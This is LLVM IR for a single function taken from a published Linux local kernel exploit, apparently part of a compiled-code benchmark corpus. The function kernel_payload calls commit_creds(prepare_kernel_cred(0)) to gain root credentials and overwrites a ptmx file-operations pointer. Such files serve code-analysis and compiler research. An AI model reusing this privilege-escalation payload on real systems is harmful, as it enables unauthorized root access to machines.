; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_31346.c_kernel_payload.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_31346.c_kernel_payload.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@COMMIT_CREDS = common dso_local global i32 0, align 4
@PREPARE_KERNEL_CRED = common dso_local global i32 0, align 4
@PTMX_FOPS = common dso_local global i64 0, align 8
@FOPS_RELEASE_OFFSET = common dso_local global i64 0, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @kernel_payload(i8* %0, i8* %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32 (i32)*, align 8
  %6 = alloca i32 (i32)*, align 8
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %7 = load i32, i32* @COMMIT_CREDS, align 4
  %8 = sext i32 %7 to i64
  %9 = inttoptr i64 %8 to i32 (i32)*
  store i32 (i32)* %9, i32 (i32)** %5, align 8
  %10 = load i32, i32* @PREPARE_KERNEL_CRED, align 4
  %11 = sext i32 %10 to i64
  %12 = inttoptr i64 %11 to i32 (i32)*
  store i32 (i32)* %12, i32 (i32)** %6, align 8
  %13 = load i64, i64* @PTMX_FOPS, align 8
  %14 = load i64, i64* @FOPS_RELEASE_OFFSET, align 8
  %15 = add nsw i64 %13, %14
  %16 = add nsw i64 %15, 4
  %17 = inttoptr i64 %16 to i32*
  store i32 -1, i32* %17, align 4
  %18 = load i32 (i32)*, i32 (i32)** %5, align 8
  %19 = load i32 (i32)*, i32 (i32)** %6, align 8
  %20 = call i32 %19(i32 0)
  %21 = call i32 %18(i32 %20)
  ret i32 -1
}

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
